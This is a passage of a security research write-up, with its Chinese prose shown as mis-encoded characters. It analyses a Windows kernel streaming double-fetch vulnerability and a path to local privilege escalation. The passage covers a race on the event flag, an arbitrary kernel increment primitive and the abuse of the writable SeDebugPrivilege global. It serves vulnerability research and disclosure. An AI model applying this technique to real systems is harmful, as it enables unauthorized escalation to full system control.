&lt;img src=&quot;/assets/img/blog/20241005/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è½‰æ›éç¨‹æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ä¾†è™•ç†&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) 
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28);  //------------------------[1]
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  //-----------------[2]
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;è€Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ä¸­ï¼Œæ˜é¡¯å¯ä»¥çœ‹åˆ°é¡ä¼¼çš„ bug patternï¼Œå¾ [1] ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå®ƒæœƒè¤‡è£½ä½¿ç”¨è€…çš„è¼¸å…¥åˆ°æ–°åˆ†é…å‡ºä¾†çš„ Buffer ä¸­ï¼Œæ¥è‘—åœ¨ [2] è™•ï¼Œå°±æœƒåˆ©ç”¨è©² Buffer ä¾†ä½¿ç”¨ KsSynchronousIoControlDevice å‘¼å«æ–°çš„ IOCTLï¼Œã€‚å…¶ä¸­ newinputbuf åŠ OutBuffer éƒ½æ˜¯ä½¿ç”¨è€…æ‰€å‚³å…¥çš„å…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; æ™‚çš„æµç¨‹ï¼Œå¤§æ¦‚å¦‚ä¸‹åœ–æ‰€ç¤º :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ WoW64 çš„ç¨‹å¼ä¸­å‘¼å« IOCTL æ™‚ï¼Œå¯ä»¥çœ‹åˆ°åœ–ä¸­ç¬¬ 2 æ­¥ I/O Manager æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; è¨­æˆ UserMode(1)ï¼Œè€Œåœ¨ç¬¬ 3 æ­¥æ™‚ï¼Œksthunk æœƒå°‡ä½¿ç”¨è€…çš„ request å¾ 32-bit è½‰æ›æˆ 64-bitï¼Œé€™é‚Šå°±æœƒç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSAutomationThunk::ThunkEnableEventIrp&lt;/code&gt; ä¾†è™•ç†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¹‹å¾Œç¬¬ 5 æ­¥ï¼Œå°±æœƒé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsSynchronousIoControlDevice&lt;/code&gt; é‡æ–°å‘¼å« IOCTL ï¼Œè€Œæ­¤æ™‚æ–°çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; å°±è®Šæˆäº† KernelMode(0) äº†ï¼Œè€Œå¾ŒçºŒçš„è™•ç†å°±å¦‚ä¸€èˆ¬çš„ IOCTL_KS_ENABLE_EVENT ç›¸åŒï¼Œå°±ä¸å¦å¤–è©³è¿°äº†ï¼Œç¸½ä¹‹æˆ‘å€‘åˆ°é€™è£¡å·²ç¶“æœ‰å€‹å¯ä»¥ä»»æ„åš IOCTL_KS_ENABLE_EVENT çš„ primitive äº†ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å¿…é ˆå°‹æ‰¾çœ‹çœ‹æ˜¯å¦æœ‰å¯ä»¥ EoP çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The Exploitation&lt;/h2&gt;
&lt;p&gt;è·Ÿå…ˆå‰æ€è·¯ä¸€æ¨£ï¼Œä¸€é–‹å§‹é‚„æ˜¯æœƒå…ˆåˆ†æå…¥å£é» ksthunkï¼Œç„¶è€Œæˆ‘å€‘æ‰¾å°‹äº†ä¸€é™£å­ä¹‹å¾Œï¼Œä¸¦æ²’æœ‰çœ‹åˆ°å¯ä»¥åšç‚ºææ¬Šçš„åœ°æ–¹ï¼Œè€Œä¸”åœ¨ ksthunk ä¸­ï¼Œå¤§å¤šæ•¸åªè¦çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestMode&lt;/code&gt; æ˜¯ KernelMode(0) å°±æœƒç›´æ¥å¾€ä¸‹å‚³éè€Œä¸å¦å¤–åšè™•ç†ã€‚å› æ­¤æˆ‘å€‘å°‡æˆ‘å€‘çš„ç›®æ¨™è½‰å‘ä½åœ¨ä¸‹ä¸€å±¤çš„ ksï¼Œçœ‹çœ‹å®ƒåœ¨è™•ç† event çš„éç¨‹ä¸­ï¼Œæ˜¯å¦æœ‰å¯ä»¥ç”¨ä¾†ææ¬Šçš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¾ˆå¿«çš„å°±æ‰¾åˆ°ä¸€å€‹å¸å¼•æˆ‘å€‘ç›®å…‰çš„åœ°æ–¹ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨ KspEnableEvent çš„ Handler ä¸­ï¼Œæœ‰ä¸€è™•æœƒå…ˆåˆ¤æ–·ä½ æ‰€å‚³å…¥çš„ KSEVENTDATA ä¸­çš„ NotificationType ä¾†æ±ºå®šè¦æ€éº¼è¨»å†ŠåŠè™•ç†ä½ çš„äº‹ä»¶ï¼Œåœ¨ä¸€èˆ¬æƒ…æ³ä¸‹é€šå¸¸æ˜¯çµ¦ä¸€å€‹ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createeventa&quot;&gt;EVENT_HANDLE&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createsemaphorea&quot;&gt;SEMAPHORE_HANDLE&lt;/a&gt;ï¼Œç„¶è€Œåœ¨ ks ä¸­ï¼Œå¦‚æœæ˜¯å¾ KernelMode å‘¼å«çš„å°±çµ¦ä»¥æä¾› &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/event-objects&quot;&gt;Event Object&lt;/a&gt; ç”šè‡³ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/introduction-to-dpc-objects&quot;&gt;DPC&lt;/a&gt; ä¾†è¨»å†Šä½ çš„äº‹ä»¶ï¼Œè®“æ•´é«”çš„è™•ç†ä¸Šæ›´æœ‰æ•ˆç‡ã€‚&lt;/p&gt;

&lt;p&gt;ä¹Ÿå°±æ˜¯èªªæˆ‘å€‘å¯ä»¥è—‰ç”±é€™å€‹ KernelMode çš„ DeviceIoControl çš„ primitive ä¾†æä¾›ä»»æ„ Kernel Objectï¼Œè®“å®ƒåšå¾ŒçºŒè™•ç†ï¼Œæ§‹é€ çš„å¥½å°±æœ‰æ©Ÿæœƒé”æˆ EoP ä½†è¦çœ‹å¾ŒçºŒæ€éº¼ä½¿ç”¨é€™å€‹ Object å°±æ˜¯äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯æˆ‘å€‘åœ¨å˜—è©¦äº†ä¸€æ®µæ™‚é–“å¾Œç™¼ç¾åˆ°â€¦â€¦&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;__int64 __fastcall CKSAutomationThunk::ThunkEnableEventIrp(__int64 ioctlcode_d, PIRP irp, __int64 a3, int *a4)
{
  ...
  if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLE
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ONESHOT
    || (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_ENABLEBUFFERED )  //-------[3]
  {
    // Convert 32-bit requests and pass down directly
  }
  else if ( (v25-&amp;gt;Parameters.DeviceIoControl.Type3InputBuffer-&amp;gt;Flags &amp;amp; 0xEFFFFFFF) == KSEVENT_TYPE_QUERYBUFFER ) //-------[4]
  {
    ...
    newinputbuf = (KSEVENT *)ExAllocatePoolWithTag((POOL_TYPE)0x600, (unsigned int)(inputbuflen + 8), &apos;bqSK&apos;);
    ...
    memcpy(newinputbuf,Type3InputBuffer,0x28); //------[5] 
    ...
    v18 = KsSynchronousIoControlDevice( 
            v25-&amp;gt;FileObject,
            0,
            IOCTL_KS_ENABLE_EVENT,
            newinputbuf,
            inputbuflen + 8,
            OutBuffer,
            outbuflen,
            &amp;amp;BytesReturned);  
    ...
  }
  ...
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å¦‚æœè¦æä¾›ä»»æ„ Kernel Object å»è¨»å†Šäº‹ä»¶ï¼Œé‚£éº¼ IOCTL ä¸­æ‰€çµ¦å®šçš„ &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/stream/ksevent-structure&quot;&gt;KSEVENT&lt;/a&gt; çš„ flagï¼Œå¿…é ˆè¦æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¨‹å¼ç¢¼ [3] çš„éƒ¨åˆ†ï¼Œç„¶è€Œåœ¨ç¨‹å¼ç¢¼ç‰‡æ®µ [4] è™•æ˜¯è§¸ç™¼æ¼æ´çš„åœ°æ–¹å»æ˜¯è¦æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;ï¼Œä¸¦æ²’è¾¦æ³•å¦‚æˆ‘å€‘æ‰€æƒ³çš„ä¸€æ¨£ç›´æ¥çµ¦ä¸€å€‹ Kernel Objectã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œå¹¸é‹çš„æ˜¯æ•´å€‹ IOCTL_KS_ENABLE_EVENT ä¹Ÿæ˜¯ä½¿ç”¨ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-neither-buffered-nor-direct-i-o&quot;&gt;Neither I/O&lt;/a&gt; ç›´æ¥æ‹¿ä½¿ç”¨è€…çš„ Input buffer ä¾†åšè³‡æ–™ä¸Šçš„è™•ç†ï¼Œ&lt;strong&gt;å†æ¬¡&lt;/strong&gt;å‡ºç¾äº† Double Fetch çš„å•é¡Œã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚ä¸Šåœ–ä¸­æ‰€ç¤ºï¼Œæˆ‘å€‘å¯ä»¥åœ¨å‘¼å« IOCTL å‰æŠŠ flag è¨­ç½®æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt;ï¼Œæª¢æŸ¥æ™‚å°±æœƒä»¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_QUERYBUFFER&lt;/code&gt; çš„åŠŸèƒ½è™•ç†ï¼Œè€Œåœ¨ç¬¬äºŒæ¬¡å‘¼å« IOCTL å‰ï¼Œå°±æŠŠ flag æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSEVENT_TYPE_ENABLE&lt;/code&gt;ï¼Œé€™æ¨£å°±å¯ä»¥æˆåŠŸè§¸ç™¼æ¼æ´ä¸¦æ§‹é€ ç‰¹å®šçš„ Kernel Object ä¾†è¨»å†Šäº‹ä»¶äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;trigger-the-event&quot;&gt;Trigger the event&lt;/h3&gt;
&lt;p&gt;è‡³æ–¼ç”šéº¼æ™‚å€™æœƒç”¨åˆ°ä½ æ‰€æ§‹é€ çš„ KS Object å‘¢? ç•¶äº‹ä»¶è§¸ç™¼æ™‚ï¼Œ ks æœƒé€é DPC å‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ks!ksGenerateEvent&lt;/code&gt;ï¼Œæ­¤æ™‚å°±æœƒä¾ç…§ä½ æ‰€çµ¦å®šçš„ NotificationType ä¾†æ±ºå®šè¦æ€éº¼è™•ç†ä½ çš„äº‹ä»¶ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å°±ä¾†çœ‹ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KsGenerateEvent&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cpp=&quot;&gt;NTSTATUS __stdcall KsGenerateEvent(PKSEVENT_ENTRY EventEntry)
{

  switch ( EventEntry-&amp;gt;NotificationType )
  {
    case KSEVENTF_DPC:
      ...
      if ( !KeInsertQueueDpc(EventEntry-&amp;gt;EventData-&amp;gt;Dpc.Dpc, EventEntry-&amp;gt;EventData, 0LL) )
        _InterlockedAdd(&amp;amp;EventEntry-&amp;gt;EventData-&amp;gt;EventObject.Increment, 0xFFFFFFFF); //--------[6]
      ...
    case KSEVENTF_KSWORKITEM:
      ...
      KsIncrementCountedWorker(eventdata-&amp;gt;KsWorkItem.KsWorkerObject); //-----------[7]

  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;å…¶å¯¦åˆ°é€™é‚Šå°±æœ‰å¤šç¨®åˆ©ç”¨æ–¹å¼å¯ä»¥åˆ©ç”¨ï¼Œæœ€ç›´æ¥çš„è«éæ–¼ç›´æ¥æ§‹é€  DPC çµæ§‹è¨»å†Š DPC ä¾†é”æˆä»»æ„ Kernel ç¨‹å¼ç¢¼åŸ·è¡Œï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢ç¨‹å¼ç¢¼ç‰‡æ®µ [6] çš„åœ°æ–¹ï¼Œ&lt;strong&gt;ä½†åœ¨å‘¼å« KsGenerateEvent æ™‚çš„ IRQL æ˜¯ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DISPATCH_LEVEL&lt;/code&gt; å¾ˆé›£åœ¨ User space ä¸‹æ§‹é€  DPC object åˆ©ç”¨éç¨‹ä¹Ÿæœƒé‡åˆ°è¨±å¤šå•é¡Œ&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æ‰€ä»¥æˆ‘å€‘æ”¹ç”¨å¦å¤–ä¸€æ¢ KSEVENTF_KSWORKITEMï¼Œä¹Ÿå°±æ˜¯ç¨‹å¼ç¢¼ç‰‡æ®µ [7] çš„éƒ¨åˆ†ï¼Œè—‰ç”±å‚³å…¥ Kernel ä½ç½®ï¼Œè®“ä»–èª¤èªç‚ºæ˜¯ KSWORKITEM çš„æŒ‡æ¨™ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å…¶ä¸­å°±æœƒå°è©²æŒ‡æ¨™æŒ‡å‘ä½ç½®åŠ ä¸Š 0x5c çš„åœ°æ–¹åŠ ä¸€ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥é”åˆ°ä»»æ„ Kerenl Address åŠ ä¸€çš„å¯«å…¥ï¼Œå…¶æ•´å€‹éç¨‹å°±å¦‚ä¸‹åœ–ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨å‘¼å« IOCTL_KS_ENABLE_EVENT æ™‚ï¼Œæ§‹é€  KSEVENTDATA æŒ‡å‘ Kernel è¨˜æ†¶é«”ä½ç½®å¾Œï¼Œks è™•ç†æ™‚å°±æœƒå°‡å®ƒä½œç‚º Kernel Object ä¾†æ“ä½œï¼Œä¸¦è¨»å†ŠæŒ‡å®šçš„äº‹ä»¶&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œåˆ°è§¸ç™¼æ™‚ï¼Œks å°±æœƒå°‡æˆ‘å€‘çµ¦çš„è¨˜æ†¶é«”ä½ç½®å…§å®¹ +1ï¼Œå› æ­¤æˆ‘å€‘é€™é‚Šå°±æœ‰äº†ä¸€å€‹ kernel ä»»æ„ +1 çš„ primitive äº†ã€‚&lt;/p&gt;

&lt;h3 id=&quot;arbitrary-increment-primitive-to-eop&quot;&gt;Arbitrary increment primitive to EoP&lt;/h3&gt;

&lt;p&gt;å¾ä»»æ„è¨˜æ†¶é«”ä½ç½® +1 åˆ°ææ¬Šæœ‰è¨±å¤šæ–¹æ³•å¯ä»¥åˆ©ç”¨ï¼Œå…¶ä¸­æœ€çŸ¥åçš„è«éæ–¼ &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; ä»¥åŠ &lt;a href=&quot;https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/&quot;&gt;IoRing&lt;/a&gt;ï¼ŒåŸæœ¬ä»¥ç‚ºåˆ°é€™é‚Šå°±å·®ä¸å¤šçµæŸäº†â€¦&lt;/p&gt;

&lt;p&gt;ç„¶è€Œä¸Šè¿°å…©ç¨®æ–¹æ³•åœ¨é€™å€‹æƒ…å¢ƒä¸­éƒ½æœ‰ä¸€å®šçš„ä¾·é™ï¼š&lt;/p&gt;

&lt;h4 id=&quot;abuse-token-privilege&quot;&gt;Abuse token Privilege&lt;/h4&gt;
&lt;p&gt;å¦‚æœæ˜¯ä»¥ Abuse token privilege æ–¹æ³•ä¾†åšææ¬Šï¼Œå…¶é—œéµåœ¨æ–¼è¦†å¯« Privileges.Enable åŠ Privileges.Presentï¼Œè€Œæˆ‘å€‘æ¼æ´ä¸€æ¬¡åªèƒ½ +1 ï¼Œå¦‚æœè¦æ‹¿åˆ° SeDebugPrivilege å°±å¿…é ˆå…©å€‹æ¬„ä½éƒ½è¦å¯«åˆ°ï¼Œé€™å…©æ ¼æ¬„ä½çš„é è¨­æ•¸å€¼ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x602880000&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x800000&lt;/code&gt; å¿…é ˆè¦è®Šæˆï¼Œ0x602&lt;strong&gt;9&lt;/strong&gt;80000 åŠ 0x&lt;strong&gt;9&lt;/strong&gt;00000ï¼Œä¹Ÿå°±æ˜¯èªªåˆ†åˆ¥éƒ½è¦å„å¯« 0x10 æ¬¡ï¼Œç¸½å…±è¦ 0x20 æ¬¡çš„å¯«å…¥ï¼Œæ¯æ¬¡çš„å¯«å…¥éƒ½è¦ raceï¼Œéœ€è¦èŠ±ä¸Šä¸å°‘æ™‚é–“ï¼Œç©©å®šåº¦ä¹Ÿå¤§å¹…ä¸‹é™ã€‚&lt;/p&gt;

&lt;h4 id=&quot;ioring&quot;&gt;IoRing&lt;/h4&gt;
&lt;p&gt;é€é IoRing ä¾†é”åˆ°ä»»æ„å¯«å…¥ï¼Œä¹Ÿè¨±æœƒæ˜¯å€‹æ›´ç°¡å–®çš„æ–¹æ³•ï¼Œåªéœ€è¦†å¯« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffersCount&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IoRing-&amp;gt;RegBuffers&lt;/code&gt; å°±å¯é”åˆ°ä»»æ„å¯«å…¥ï¼Œç„¶è€Œæœ‰å€‹å•é¡Œå°±ç™¼ç”Ÿäº†â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åœ¨è§¸ç™¼ä»»æ„è¨˜æ†¶é«”ä½ç½® +1 é€™å€‹ primitive æ™‚ï¼Œå¦‚æœåŸå…ˆçš„æ•¸å€¼æ˜¯ 0 æ™‚ï¼Œå°±æœƒé€²åˆ° KsQueueWorkItem ä¸­ï¼Œå…¶ä¸­æœƒæœ‰ä¸€äº›ç›¸å°æ‡‰è¤‡é›œçš„è™•ç†ï¼Œå°±æœƒå°è‡´ BSoDï¼Œ IoRing çš„åˆ©ç”¨æ–¹å¼å‰›å¥½å°±æœƒé‡åˆ°é€™ç‹€æ³â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ˜¯ä¸æ˜¯çœŸçš„æ²’è¾¦æ³•ç©©å®šåˆ©ç”¨äº†å‘¢?&lt;/p&gt;

&lt;h4 id=&quot;lets-find-a-new-way-&quot;&gt;Letâ€™s find a new way !&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;ç•¶å‚³çµ±çš„åˆ©ç”¨æ–¹æ³•é‡åˆ°ç“¶é ¸æ™‚ï¼Œæ·±å…¥æ¢è¨æŠ€è¡“çš„æ ¸å¿ƒæ©Ÿåˆ¶å¯èƒ½æœƒæ˜¯å€¼å¾—çš„ã€‚ä½ æˆ–è¨±æœƒåœ¨æ­¤éç¨‹ä¸­æ„å¤–ç™¼ç¾æ–°çš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;ç¶“éå¹¾å¤©æ²‰æ€ä¹‹å¾Œï¼Œæˆ‘å€‘æ±ºå®šæ‰¾å°‹æ–°æ–¹æ³•ï¼Œä½†å¾é ­æ‰¾æ–°çš„æ–¹æ³•å¯èƒ½æœƒèŠ±ä¸å°‘æ™‚é–“ä¹Ÿå¯èƒ½æ‰¾ä¸åˆ°ï¼Œæ–¼æ˜¯æˆ‘å€‘æ±ºå®šå¾èˆŠæœ‰çš„å…©å€‹æ–¹æ³•ä¸­æ‰¾å°‹æ–°çš„éˆæ„Ÿï¼Œé¦–å…ˆä¾†çœ‹çš„æ˜¯ Abuse token privilegeï¼Œå…¶ä¸­æœ€é—œéµçš„å°±æ˜¯åˆ©ç”¨æ¼æ´æ‹¿åˆ° SeDebugPrivilege ä½¿å¾—æˆ‘å€‘å¯ä»¥ Open åƒæ˜¯ winlogon ç­‰é«˜æ¬Šé™çš„ Processã€‚&lt;/p&gt;

&lt;p&gt;å•é¡Œå°±ä¾†äº†ï¼Œ&lt;strong&gt;ç‚ºä»€éº¼åªè¦æœ‰ SeDebugPrivilege å°±å¯ä»¥é–‹å•Ÿé«˜æ¬Šé™çš„ Process å‘¢ï¼Ÿ&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šå°±è¦ä¾†çœ‹ä¸€ä¸‹ PsOpenProcessï¼Œä»¥ä¸‹æ˜¯ PsOpenProcess çš„ç¨‹å¼ç¢¼ç‰‡æ®µï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ­¤å¯è¦‹ï¼Œç•¶æˆ‘å€‘åœ¨ Open Process æ™‚ï¼Œ kernel æœƒå„ªå…ˆä½¿ç”¨ SeSinglePrivilegeCheck æª¢æŸ¥ä½ æ˜¯å¦æœ‰ SeDebugPrivilegeï¼Œå¦‚æœä½ å…·æœ‰ SeDebugPrivilege é‚£å°±æœƒçµ¦ä½  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PROCESS_ALL_ACCESS&lt;/code&gt; çš„æ¬Šé™ï¼Œä¸æœƒæœ‰å…¶ä»– ACL çš„æª¢æŸ¥ï¼Œè®“ä½ å¯ä»¥å°ä»»æ„ Process å»åšä»»ä½•äº‹æƒ…ï¼Œé¡§åæ€ç¾©å°±æ˜¯è®“ä½  Debug ç”¨çš„ï¼Œç„¶è€Œæœ‰ä¸€é»å€¼å¾—æ³¨æ„çš„åœ°æ–¹æ˜¯ SeDebugPrivilege æ˜¯åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ntoskrnl.exe&lt;/code&gt; ä¸Šçš„å…¨åŸŸè®Šæ•¸ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å®ƒæœƒæ˜¯å€‹ &lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-luid&quot;&gt;LUID&lt;/a&gt; çµæ§‹ï¼Œæœƒåœ¨ç³»çµ±å•Ÿå‹•æ™‚åˆå§‹åŒ–ï¼Œå¯¦éš›æ•¸å€¼ç‚º 0x14 ï¼Œè¡¨ç¤ºåœ¨ Privileges.Enable åŠ Privileges.Present æ¬„ä½ä¸­å“ªå€‹ bit æ˜¯ä»£è¡¨ SeDebugPrivilegeã€‚æ‰€ä»¥ç•¶æˆ‘å€‘åœ¨ç”¨ NtOpenProcess æ™‚ï¼Œç³»çµ±å»æŸ¥çœ‹é€™å€‹å…¨åŸŸè®Šæ•¸ä¸­çš„æ•¸å€¼ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç²å¾—è¦æª¢æŸ¥çš„æ•¸å€¼å¾Œï¼Œå°±æœƒä¾ç…§é€™å€‹æ•¸å€¼å»æª¢æŸ¥ Token ä¸­çš„ Privileges æ¬„ä½æ˜¯å¦æœ‰ Enable åŠ Present é€™å€‹æ¬„ä½ï¼Œä»¥ SeDebugPrivilege ä¾†èªªå°±æœƒæª¢æŸ¥&lt;strong&gt;ç¬¬ 0x14 bit&lt;/strong&gt;ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç„¶è€Œæœ‰ä¸€ä»¶æœ‰è¶£çš„äº‹æƒ…æ˜¯â€¦&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt!SeDebugPrivilege&lt;/code&gt; é€™å€‹å…¨åŸŸè®Šæ•¸æ˜¯&lt;strong&gt;ä½æ–¼å¯å¯«çš„å€æ®µä¸­&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;å› æ­¤ä¸€å€‹æ–°çš„æƒ³æ³•å°±èª•ç”Ÿäº†ã€‚&lt;/p&gt;

&lt;h4 id=&quot;make-abusing-token-privilege-great-again-&quot;&gt;Make abusing token privilege great again !&lt;/h4&gt;

&lt;p&gt;é è¨­æƒ…æ³ä¸‹ï¼Œä¸€èˆ¬æ¬Šé™çš„ä½¿ç”¨è€…æœƒåƒé€™å¼µåœ–ä¸€æ¨£ï¼Œåƒ…æœ‰å°‘æ•¸çš„ Privileges&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20241005/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

